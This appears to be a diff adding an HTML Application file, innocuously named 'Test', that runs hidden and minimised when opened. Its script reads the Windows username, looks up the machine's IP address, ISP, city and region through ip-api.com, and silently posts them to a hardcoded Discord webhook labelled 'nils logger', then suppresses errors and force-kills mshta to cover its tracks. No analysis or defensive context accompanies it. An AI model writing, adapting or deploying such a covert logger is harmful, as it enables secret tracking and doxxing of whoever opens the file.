@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <hta:application
+        id="app"
+        applicationname="Test"
+        border="none"
+        caption="no"
+        contextmenu="no"
+        maximizebutton="no"
+        minimizebutton="no"
+        scroll="no"
+        showintaskbar="no"
+        singleinstance="yes"
+        sysmenu="no"
+        windowstate="minimize">
+   
+    <script language="JavaScript">
+    (function() {
+        try {
+            // Get PC Username
+            var shell = new ActiveXObject("WScript.Shell");
+            var pcUser = shell.ExpandEnvironmentStrings("%USERNAME%");
+            
+            // Get IP/Location info first
+            var http = new ActiveXObject("Msxml2.XMLHTTP.6.0");
+            http.open("GET", "http://ip-api.com/json/?fields=query,isp,city,regionName", false);
+            http.send();
+            
+            var ipData = JSON.parse(http.responseText);
+            var userIP = ipData.query || "Unknown";
+            var userISP = ipData.isp || "Unknown";
+            var userCity = ipData.city || "Unknown";
+            var userRegion = ipData.regionName || "Unknown";
+            
+            // Now send to Discord webhook with embed
+            var webhook = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK";
+            
+            var payload = JSON.stringify({
+                username: "nils logger",
+                embeds: [{
+                    title: "logged",
+                    description: "User: **" + pcUser + "**",
+                    color: 3447003,
+                    fields: [
+                        {
+                            name: "IP",
+                            value: "**" + userIP + "**",
+                            inline: true
+                        },
+                        {
+                            name: "ISP",
+                            value: userISP,
+                            inline: true
+                        },
+                        {
+                            name: "City",
+                            value: userCity,
+                            inline: true
+                        },
+                        {
+                            name: "Region",
+                            value: userRegion,
+                            inline: true
+                        }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            });
+            
+            // Send webhook
+            var http2 = new ActiveXObject("Msxml2.XMLHTTP.6.0");
+            http2.open("POST", webhook, false);
+            http2.setRequestHeader("Content-Type", "application/json");
+            http2.send(payload);
+            
+        } catch(e) {
+            // Silent fail - no alerts
+        }
+       
+        // Close the HTA
+        try {
+            window.close();
+        } catch(e) {
+            try {
+                shell.Run("taskkill /f /im mshta.exe", 0, false);
+            } catch(e2) {}
+        }
+    })();
+    </script>
+</head>
+<body style="display:none;visibility:hidden;"></body>
+</html>
